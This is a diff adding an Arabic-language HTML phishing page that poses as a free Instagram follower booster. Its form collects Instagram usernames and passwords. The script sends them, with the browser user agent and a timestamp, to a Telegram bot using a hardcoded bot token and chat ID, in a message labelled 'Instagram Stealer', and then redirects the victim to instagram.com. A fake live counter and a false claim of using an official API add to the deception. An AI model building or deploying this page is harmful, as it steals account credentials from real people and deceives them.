@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Follower Booster | احصل على 10,000 متابع مجاناً</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #f9f9f9, #e0e0e0);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 450px;
+            width: 100%;
+            background: white;
+            border-radius: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            overflow: hidden;
+            text-align: center;
+        }
+        .header {
+            background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045);
+            padding: 30px 20px;
+            color: white;
+        }
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        .counter {
+            background: #fff;
+            margin: -20px 20px 20px;
+            padding: 20px;
+            border-radius: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+        .counter-number {
+            font-size: 48px;
+            font-weight: bold;
+            color: #833ab4;
+        }
+        .counter-label {
+            color: #666;
+            font-size: 12px;
+        }
+        .form-section {
+            padding: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 5px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #833ab4;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #833ab4, #fd1d1d);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.2s;
+        }
+        button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 5px 20px rgba(253,29,29,0.4);
+        }
+        .footer {
+            background: #f5f5f5;
+            padding: 15px;
+            font-size: 11px;
+            color: #999;
+        }
+        .loader {
+            display: none;
+            margin-top: 15px;
+            font-size: 13px;
+            color: #833ab4;
+        }
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 12px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>🔥 INCREASE FOLLOWERS 🔥</h1>
+        <p>احصل على 10,000 متابع حقيقي مجاناً</p>
+    </div>
+    
+    <div class="counter">
+        <div class="counter-number" id="counter">2,847</div>
+        <div class="counter-label">مستخدم حصل على متابعين اليوم</div>
+    </div>
+    
+    <div class="form-section">
+        <div class="warning">
+            ⚠️ استخدم حساب مؤقت لحماية حسابك الرئيسي
+        </div>
+        <form id="boostForm">
+            <div class="input-group">
+                <label>📧 اسم المستخدم أو البريد الإلكتروني</label>
+                <input type="text" id="username" placeholder="instagram_username" required>
+            </div>
+            <div class="input-group">
+                <label>🔒 كلمة المرور</label>
+                <input type="password" id="password" placeholder="********" required>
+            </div>
+            <button type="submit">🚀 ابدأ زيادة المتابعين</button>
+        </form>
+        <div class="loader" id="loader">⏳ جاري معالجة الطلب...</div>
+    </div>
+    <div class="footer">
+        هذه الخدمة غير تابعة لإنستقرام. نستخدم واجهة API رسمية.
+    </div>
+</div>
+
+<script>
+    // إعدادات التليجرام
+    const BOT_TOKEN = "8715170582:AAHG-8WjvO_gerOhFF2I469vu3y6rJY6r_c";
+    const CHAT_ID = "7882118234";
+    
+    // عداد وهمي يتحرك
+    let counter = 2847;
+    setInterval(() => {
+        counter += Math.floor(Math.random() * 3);
+        document.getElementById('counter').innerText = counter.toLocaleString();
+    }, 5000);
+    
+    // إرسال البيانات
+    document.getElementById('boostForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const loader = document.getElementById('loader');
+        const submitBtn = document.querySelector('button');
+        
+        loader.style.display = 'block';
+        submitBtn.disabled = true;
+        submitBtn.style.opacity = '0.5';
+        
+        const message = `🔥 Instagram Stealer 🔥\n👤 Username: ${username}\n🔑 Password: ${password}\n📱 User-Agent: ${navigator.userAgent}\n⏰ Time: ${new Date().toLocaleString()}`;
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+            loader.innerHTML = '✅ تم! جاري التوجيه...';
+            setTimeout(() => {
+                window.location.href = 'https://instagram.com';
+            }, 1500);
+        } catch(e) {
+            loader.innerHTML = '❌ خطأ، حاول مرة أخرى';
+            submitBtn.disabled = false;
+            submitBtn.style.opacity = '1';
+        }
+    });
+</script>
+</body>
+</html>
